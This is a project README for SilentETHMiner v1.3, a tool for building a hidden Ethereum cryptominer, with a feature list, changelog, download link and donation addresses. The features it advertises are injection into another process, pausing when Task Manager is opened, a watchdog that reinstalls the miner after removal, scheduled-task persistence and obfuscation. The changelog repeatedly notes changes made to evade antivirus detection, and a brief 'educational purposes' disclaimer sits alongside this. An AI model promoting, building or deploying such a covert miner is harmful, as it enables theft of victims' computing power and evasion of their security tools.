
<img src="https://github.com/UnamSanctam/SilentETHMiner/blob/master/SilentETHMiner.png?raw=true">

# SilentETHMiner v1.3 - Based on Lime Miner v0.3


## Main Features

* .NET - Coded in Visual Basic .NET, requires .NET Framework 4.5
 
* Codedom - No need for external libraries to compile

* Injection (Silent) - Hide payload behind another process

* Idle Mining - Can be configured to only mine when the computer isn't in use
  
* Stealth - Pauses the miner while Task Manager, Process Explorer or Process Hacker is open

* Watchdog - Replaces the miner if removed and starts it if closed down

* Ethash - Supports mining all Ethash coins like Ethereum, Ethereum Classic, Metaverse, Ellaism, QuarkChain and others

## Downloads

Pre-Compiled: https://github.com/UnamSanctam/SilentETHMiner/releases

## My Other Miners

[Silent XMR (Monero) Miner](https://github.com/UnamSanctam/SilentXMRMiner)

## Requirements

When mining with the Ethash algorithm you need to have enough GPU memory left to store the DAG. So for example, mining Ethereum requires you to have at least a minimum GPU memory of 4.14 GB available since that is the size of the DAG as of writing this. Due to this, GPUs that have less available memory than the required DAG are not able to mine at all.
The other thing required is a recent enough CUDA or OpenCL compatible driver for your GPU.

So the requirements are as follow:
1. Enough GPU memory for the DAG
2. Supported drivers

## Changes


# v1.3 (09/04/2021)
* Fixed critial bug on some Windows systems
* Added Task Scheduler startup when miner has administrator privileges
* Replaced and improved injector
* Added advanced options form
* Added debug option to display errors for testing
* Added ability to obfuscate watchdog
* Fixed miscellaneous bugs
# v1.2 (01/04/2021)
* Updated miner
* Added timer that reinitalizes GPU and memory every 30 minutes for better longevity during long mining sessions
* Recoded injector and watchdog from VB to C#
* Overall improved watchdog and injector
* Decreased antivirus detections
* Added built-in function name obfuscation
# v1.1 (28/03/2021)
* Improved miner
* Added compatability for RTX 3000 series cards among others
* Updated Watchdog
* Improved injector workflow reliability
* Changed encryption since the code was detected
# v1.0.2 (23/03/2021)
* Better support for running XMR miner and ETH miner simultaniously
* Changed encryption
# v1.0.1 (20/03/2021)
* Added support for proxy mining
# v1.0 (20/03/2021)
* Inital release

## Author

* **Unam Sanctam**
* Credit to **NYAN CAT** 


## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details

## Donate

XMR: 8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N

BTC: bc1qu9rvkx7tjw9u003chtwfuf6s42fp3lmcfttk7f

ETH: 0x36f89Aa53789802c79c03d96673f2ca8eBd08438